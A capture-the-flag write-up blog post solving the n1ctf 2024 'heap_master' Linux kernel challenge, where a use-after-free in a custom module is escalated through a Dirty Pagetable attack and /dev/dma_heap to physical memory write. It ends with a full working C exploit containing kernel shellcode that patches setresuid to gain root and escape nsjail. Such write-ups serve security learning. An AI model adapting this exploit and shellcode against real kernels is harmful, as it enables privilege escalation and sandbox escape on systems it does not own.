+++
title = 'heap_master - n1ctf 2024'
date = 2025-01-09T15:59:10+01:00
draft = false
+++

heap_master was a kernel pwn challenge from n1ctf. I didn't play the ctf, allthough the 
challenge seemed nice to upsolve. let's get started

for the environment, we were given a linux `6.1.110` image as well as a config file. before 
looking at the config file, the fact that we have an nsjail environment. in our case, this 
means a bunch of disabled syscalls, no setuid binaries, and only few useful files in `/dev` 
and `/proc` directories. the goal is hereby not only to get root, but also escape the nsjail
to read `flag.txt`. we need to take this into account when creating our exploit.

the challenge consists of a vulnerable kernel module `vuln.ko`, which exposes a char device at
`/dev/safenote`. the module itself is quite simple:
```c
__int64 __fastcall safenote_ioctl(file *f, unsigned int cmd, unsigned __int64 arg)
{
  __int64 v3; // rdx
  __int64 result; // rax
  u_int32_t heap_idx; // edx

  _fentry__();
  if ( copy_from_user(&ioc_arg, v3, 4LL) )
    return -EFAULT;
  if ( cmd == 0x1338 )
  {
    if ( ioc_arg.heap_idx <= 0xff )
    {
      if ( !note[ioc_arg.heap_idx] )
        return 0;
      kfree(note[ioc_arg.heap_idx]);
      note[ioc_arg.heap_idx] = 0;
      return 0;
    }
    return -EINVAL;
  }
  if ( cmd == 0x1339 )
  {
    if ( !backdoor_used && ioc_arg.heap_idx <= 0xff )
    {
      if ( !note[ioc_arg.heap_idx] )
        return 0;
      kfree(note[ioc_arg.heap_idx]);
      result = 0;
      backdoor_used = 1;
      return result;
    }
    return -EINVAL;
  }
  result = -EINVAL;
  if ( cmd == 0x1337 )
  {
    heap_idx = ioc_arg.heap_idx;
    if ( ioc_arg.heap_idx <= 0xff && !note[ioc_arg.heap_idx] )
    {
      note[heap_idx] = (char *)kmem_cache_alloc(note_kcache, \
        ___GFP_ACCOUNT|___GFP_KSWAPD_RECLAIM|___GFP_DIRECT_RECLAIM|___GFP_FS|___GFP_IO);
      if ( note[ioc_arg.heap_idx] )
        return 0;
      return -ENOMEM;
    }
  }
  return result;
}
```
the basic functionality is to allocate and free heap chunks. however there is a backdoor, which
lets us free a single chunk without clearing its reference, resulting in a single use-after-free.
how do we continue? it's obvious that we need to do some kind of cross-cache attack, in order
to break out of the accounted kmem cache dedicated to this module. 

while searching for the right objects, I found out that `msg_msg` object is not easily sprayable,
plus userfaultfd and FUSE seem to be impossible. however I found `pipe_buf` and the associated
struct `page` is a good candidate to do some pre-spraying, since you can spray a lot of data at once.
this worked, and we can overlap our uaf chunk with user controlled data:
```
pwndbg> x/200gx 0xffffffffc0233420
0xffffffffc0233420:	0x0000000000000000	0x0000000000000000
0xffffffffc0233430:	0x0000000000000000	0x0000000000000000
...
0xffffffffc0233a10:	0x0000000000000000	0x0000000000000000
0xffffffffc0233a20:	0xffff9fb35767e100	0x0000000000000000
0xffffffffc0233a30:	0x0000000000000000	0x0000000000000000
pwndbg> x/20gx 0xffff9fb35767e100
0xffff9fb35767e100:	0x4141414141414141	0x4141414141414141
0xffff9fb35767e110:	0x4141414141414141	0x4141414141414141
0xffff9fb35767e120:	0x4141414141414141	0x4141414141414141
...
```

however I found it quite difficult to corrupt `pipe_buf` itself, so we need a second target object.
I came to the conclusion, that spraying struct `file` wouldn't be a bad idea, since we have
sufficient permissions and it has `f_ops` member, which points to a function table. we could
corrupt this pointer to get rip control, plus identify the exact struct `file` which overlaps:
```c
    int fds[0x1000];

    for(int i = 0; i < 0x1000; i++) {
        fds[i] = open("/tmp/x", O_RDWR);
        if(fds[i] < 0) {
            perror("open");
            exit(-1);
        } 
    }

    uaf_delete(fd, loc); // free's struct file

    int fds2[0x1000];

    for(int i = 0; i < 0x1000; i++)
        fds2[i] = open("/bin/busybox", O_RDONLY);

    unsigned long x = 0x4141414141414141;
    int overlap_idx = -1;

    for(int i = 0; i < 0x1000; i++) {
        if(write(fds[i], &x, 8) < 0) {
            perror("write");
            overlap_idx = i;
            break;
        }
    }
```
(we achieve this by checking if file permissions have been altered)

I could sucessfully identify the uaf'ed `file` struct and even overlap with user data:
```
/tmp $ /exp/exp 
[*] device fd: 3
[*] before uaf trigger
[*] triggered free
write: Bad file descriptor
[*] overlap idx: 1586
[*] overlapping done
[*] trigger rip
[    4.364698] general protection fault, probably for non-canonical address 0x41414141414141b9: 0000 [#1] PREEMPT SMP PTI
[    4.365244] CPU: 1 PID: 157 Comm: exp Tainted: G           OE      6.1.110 #12
[    4.365244] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[    4.365244] RIP: 0010:filp_close+0x1e/0x70
[    4.365244] Code: 00 48 83 c7 10 e9 a2 94 04 00 66 90 0f 1f 44 00 00 41 55 41 54 49 89 f4 55 48 8b 47 38 48 8b 77 28 48 85 c0 0f 84 7e 40 e1 00 <48> 8f
[    4.365244] RSP: 0018:ffffaca3c0483f00 EFLAGS: 00000206
[    4.365244] RAX: 4141414141414141 RBX: 0000000000000000 RCX: 0000000000000000
[    4.365244] RDX: 0000000000000001 RSI: 4141414141414141 RDI: ffff910896633200
[    4.365244] RBP: ffffaca3c0483f48 R08: ffff91089fa88000 R09: 0000000035593770
[    4.365244] R10: 0000000000000636 R11: 0000000000000000 R12: ffff91088da9eec0
[    4.365244] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[    4.365244] FS:  00000000355923c0(0000) GS:ffff91089ef00000(0000) knlGS:0000000000000000
[    4.365244] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    4.365244] CR2: 0000000000712334 CR3: 000000000db0e000 CR4: 00000000003006e0
```
now we theoretically have rip control, but we're missing kernel heap and `text` leaks. this
was the point where I scrapped the idea of getting rip control with `f_op`.

however then I found out about a [blogpost](https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606#Dirty-Pagetable) from ptr-yudai. basically we are elevating our
`file` uaf to a pagetable uaf to create overlapping pages. also there comes `/dev/dma_heap`
into play, which helps us to get a physical kernel address r/w. as soon as we achieve this,
we can just write our shellcode to a kernel function.

in my exploit, I chose `setresuid` to overwrite. in our shellcode we need to get root as well 
as escaping the nsjail. this worked flawlessly thanks to the inspiration from ptr-yudai.
we get the flag and win:
```
/tmp $ /exp/exp 
[*] device fd: 3
[*] before uaf trigger
[*] triggered free
write: Bad file descriptor
[*] overlap idx: 1793
[*] overlapping done
[*] doing pte spray
[*] dma_buf_fd: 5
[*] doing pte spray done
[*] corrupt pte entry
[*] searching for overlapping page
[*] found overlapping page: 0xf2427000
[*] remapping...
[*] corrupt pte entry again
[*] dma buffer contains: 0x8000000012676867
[*] dma buffer contains: 0x800000000009c067
[*] found victim page table: 0xeea00000
[*] physical kbase: 0xb000000
[*] dma buffer contains: 0x800000000b1af067
[*] uid: 0
[*] win!
flag{1337}
[*] done
```
the full exploit is here:
```c
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/dma-heap.h>

#define CREATE_CHUNK 4919
#define DELETE_CHUNK 4920
#define DELETE_CHUNK_NOZERO 4921

#define MAX_IDX 0xff

void bind_cpu(int cpu) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);

    return;
}

void unshare_setup() {
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    return;
}

int **spray_pipes(int cnt) { // 0x4
    int **pipe_fd = malloc(cnt*8 + 1);

    for (int i = 0; i < cnt; i++) {
        pipe_fd[i] = malloc(0x10 + 1);

        if(pipe(pipe_fd[i]) < 0) {
            perror("pipe");
            exit(-1);
        }
    }

    char data[0x1000];
    memset(data, 0x41, 0x1000);

    for(int i = 0; i < 0x10; i++) {
        *(unsigned long *)(data + i*0x100 + 0x40) = 0x000f801f00008002;
    } 

    for (int i = 0; i < cnt; i++) {
        for (int j = 0; j < 0x10; j++)
            write(pipe_fd[i][1], data, 0x1000);
    }

    return pipe_fd;
}

void free_pipes(int **pipe_fd, int cnt) {
    for (int i = 0; i < cnt; i ++) {
        if (close(pipe_fd[i][0]) < 0) {
            perror("close");
            exit(-1);
        }
        if (close(pipe_fd[i][1]) < 0) {
            perror("close");
            exit(-1);
        }
        free(pipe_fd[i]);
    }
    free(pipe_fd);
}

int create(int fd, unsigned int idx) { 
    int ret = ioctl(fd, CREATE_CHUNK, (void *)&idx);
    if(ret < 0) {
        perror("ioctl");
        exit(-1);
    }
    return ret;
}

int delete(int fd, unsigned int idx) { 
    int ret = ioctl(fd, DELETE_CHUNK, (void *)&idx);
    if(ret < 0) {
        perror("ioctl");
        exit(-1);
    }
    return ret;
}

int delete_nozero(int fd, unsigned int idx) {
    int ret = ioctl(fd, DELETE_CHUNK_NOZERO, (void *)&idx);
    if(ret < 0) {
        perror("ioctl");
        exit(-1);
    }
    return ret;
}

int scan_mem(void *mem, unsigned long pattern, int sz) {
    for(int i = 0; i < sz-7; i++) {
        if(!memcmp(mem, &pattern, 0x8)) {
            return i;
        }
        mem += 1;
    }

    return -1;
}

void print_arr(void *arr, unsigned int n, unsigned int size) {
    for (unsigned i = 0; i < n; ++i) {
        switch(size) {
            case 1:
            printf("%u: %hhx\n", i, *(uint8_t *)(arr + i));
            break;
            case 2:
            printf("%u: %hx\n", i, *(uint16_t *)(arr + i*2));
            break;
            case 4:
            printf("%u: %x\n", i, *(uint32_t *)(arr + i*4));
            break;
            case 8:
            printf("%u: %lx\n", i, *(uint64_t *)(arr + i*8));
            break;
        }
    }
}

int *spray_seq(int cnt) {
    int *fds = calloc(cnt, sizeof(int));

    for(int i = 0; i < cnt; i++) {
        fds[i] = open("/proc/self/stat", O_RDONLY);
        if(fds[i] < 0) {
            perror("open");
            exit(-1);
        } 
    }

    return fds;
}

unsigned long user_cs, user_ss, user_rsp, user_rflags;
static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

static void win() {
    char buf[0x100];
    int fd = open("/flag", O_RDONLY);
    printf("[*] uid: %d\n", getuid());

    if (fd < 0) {
        perror("open");
        puts("[-] lose...");
    } else {
        puts("[*] win!");
        read(fd, buf, 0x100);
        write(1, buf, 0x100);
        puts("[*] done");
    }
    
    getchar();
}

int main() {
    if(!fork()) {
        char *const args[] = {"/bin/touch", "/tmp/x"};
        execve("/bin/touch", args, NULL);
    }

    save_state();
    bind_cpu(0);

    void *page_spray[0x2000];
    for (int i = 0; i < 0x2000; i++) {
        page_spray[i] = mmap((void*)(0xdead0000UL + i*0x10000UL),
                            0x8000, PROT_READ|PROT_WRITE,
                            MAP_ANONYMOUS|MAP_SHARED, -1, 0);
        if (page_spray[i] == MAP_FAILED) perror("mmap");
    }

    int fd = open("/dev/safenote", O_RDWR);
    printf("[*] device fd: %d\n", fd);

    int **pipes1 = spray_pipes(0x30);

    for(int i = MAX_IDX; i >= 0; i--) {
        create(fd, i);
    }

    int **pipes2 = spray_pipes(0x30);

    free_pipes(pipes2, 0x30);

    int loc = 0xc0;

    for(int i = 0; i < loc; i++) {
        delete(fd, i);
    }

    delete_nozero(fd, loc);
    
    for(int i = loc+1; i < MAX_IDX+1; i++) {
        delete(fd, i);
    }

    free_pipes(pipes1, 0x30);

    int fds[0x1000];

    for(int i = 0; i < 0x1000; i++) {
        fds[i] = open("/tmp/x", O_RDWR);
        if(fds[i] < 0) {
            perror("open");
            exit(-1);
        } 
    }

    printf("[*] before uaf trigger\n");

    delete(fd, loc);

    printf("[*] triggered free\n");

    int fds2[0x1000];

    for(int i = 0; i < 0x1000; i++)
        fds2[i] = open("/bin/busybox", O_RDONLY);

    unsigned long x = 0x4141414141414141;
    int overlap_idx = -1;

    for(int i = 0; i < 0x1000; i++) {
        if(write(fds[i], &x, 8) < 0) {
            perror("write");
            overlap_idx = i;
            break;
        }
    }

    if(overlap_idx == -1) {
        printf("[-] overlapping file not found, exploit fail\n");
        exit(-1);
    }

    printf("[*] overlap idx: %d\n", overlap_idx);
    printf("[*] overlapping done\n");

    for(int i = 0; i < 0x1000; i++)
        close(fds2[i]);

    for(int i = 0; i < 0x1000; i++) {
        if(i != overlap_idx)
            close(fds[i]);
    }

    printf("[*] doing pte spray\n");

    for (int i = 0; i < 0x1000; i++)
        for (int j = 0; j < 8; j++)
            *(char*)(page_spray[i] + j*0x1000) = 'A' + j;

    int dmafd = -1, dma_buf_fd = -1;
    struct dma_heap_allocation_data data;

    data.len = 0x1000;
    data.fd_flags = O_RDWR;
    data.heap_flags = 0;
    data.fd = 0;

    dmafd = open("/dev/dma_heap/system", O_RDWR);
    if (dmafd < 0) {
        perror("open");
        exit(-1);
    }

    if (ioctl(dmafd, DMA_HEAP_IOCTL_ALLOC, &data) < 0) {
        perror("ioctl");
        exit(-1);
    }

    printf("[*] dma_buf_fd: %d\n", dma_buf_fd = data.fd);

    for (int i = 0x1000; i < 0x2000; i++)
        for (int j = 0; j < 8; j++)
            *(char*)(page_spray[i] + j*0x1000) = 'A' + j;

    printf("[*] doing pte spray done\n");

    printf("[*] corrupt pte entry\n");

    for (int i = 0; i < 0x1000; i++)
        if(dup(fds[overlap_idx]) < 0)
            perror("dup");

    printf("[*] searching for overlapping page\n");

    void *evil = NULL;
    for (int i = 0; i < 0x2000; i++) {
        if (*(char*)(page_spray[i] + 7*0x1000) != 'A' + 7) {
            evil = page_spray[i] + 0x7000;
            printf("[*] found overlapping page: %p\n", evil);
            break;
        }
    }
    if (evil == NULL) {
        printf("[-] overlapping page not found, exploit fail\n");
        exit(-1);
    }

    printf("[*] remapping...\n");
    munmap(evil, 0x1000);
    void *dma = mmap(evil, 0x1000, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_POPULATE, dma_buf_fd, 0);
    *(char*)dma = '0';

    printf("[*] corrupt pte entry again\n");

    for (int i = 0; i < 0x1000; i++)
        if(dup(fds[overlap_idx]) < 0)
            perror("dup");

    printf("[*] dma buffer contains: 0x%lx\n", *(size_t*)dma);

    void *arb_buf = NULL;
    *(size_t*)dma = 0x800000000009c067;

    printf("[*] dma buffer contains: 0x%lx\n", *(size_t*)dma);

    for (int i = 0; i < 0x2000; i++) {
        if (page_spray[i] == evil) continue;
        if (*(size_t*)page_spray[i] > 0xffff) {
            arb_buf = page_spray[i];
            printf("[*] found victim page table: %p\n", arb_buf);
        }
    }

    size_t phys_base = ((*(size_t*)arb_buf) & ~0xfff) - 0x3a04000;
    printf("[*] physical kbase: 0x%lx\n", phys_base);

    *(size_t*)dma = 0x8000000000000000 + phys_base + 0x1af000 + 0x67; // setresuid

    printf("[*] dma buffer contains: 0x%lx\n", *(size_t*)dma);

    char shellcode[] = "\xF3\x0F\x1E\xFA\xE8\x00\x00\x00\x00\x41\x5F\x49\x81\xEF\x59\xF5\x1A\x00\x49\x8D\xBF\x00\x6B\xA7\x02\x49\x8D\x87\x70\x26\x1C\x00\xFF\xD0\xBF\x01\x00\x00\x00\x49\x8D\x87\xA0\x8F\x1B\x00\xFF\xD0\x48\x89\xC7\x49\x8D\xB7\xC0\x68\xA7\x02\x49\x8D\x87\xD0\x0A\x1C\x00\xFF\xD0\x49\x8D\xBF\x20\x53\xBB\x02\x49\x8D\x87\xF0\xC0\x45\x00\xFF\xD0\x48\x89\xC3\x48\xBF\x11\x11\x11\x11\x11\x11\x11\x11\x49\x8D\x87\xA0\x8F\x1B\x00\xFF\xD0\x48\x89\x98\x28\x08\x00\x00\x31\xC0\x48\x89\x04\x24\x48\x89\x44\x24\x08\x48\xB8\x22\x22\x22\x22\x22\x22\x22\x22\x48\x89\x44\x24\x10\x48\xB8\x33\x33\x33\x33\x33\x33\x33\x33\x48\x89\x44\x24\x18\x48\xB8\x44\x44\x44\x44\x44\x44\x44\x44\x48\x89\x44\x24\x20\x48\xB8\x55\x55\x55\x55\x55\x55\x55\x55\x48\x89\x44\x24\x28\x48\xB8\x66\x66\x66\x66\x66\x66\x66\x66\x48\x89\x44\x24\x30\x49\x8D\x87\xC6\x11\x40\x01\xFF\xE0\xCC";

    void *p;
    p = memmem(shellcode, sizeof(shellcode), "\x11\x11\x11\x11\x11\x11\x11\x11", 8);
    *(size_t*)p = getpid();
    p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22", 8);
    *(size_t*)p = (size_t)&win;
    p = memmem(shellcode, sizeof(shellcode), "\x33\x33\x33\x33\x33\x33\x33\x33", 8);
    *(size_t*)p = user_cs;
    p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44", 8);
    *(size_t*)p = user_rflags;
    p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55", 8);
    *(size_t*)p = user_rsp;
    p = memmem(shellcode, sizeof(shellcode), "\x66\x66\x66\x66\x66\x66\x66\x66", 8);
    *(size_t*)p = user_ss;

    memcpy(arb_buf+0x550, shellcode, sizeof(shellcode));

    setresuid(1000, 1000, 1000);

    return 0;
}
```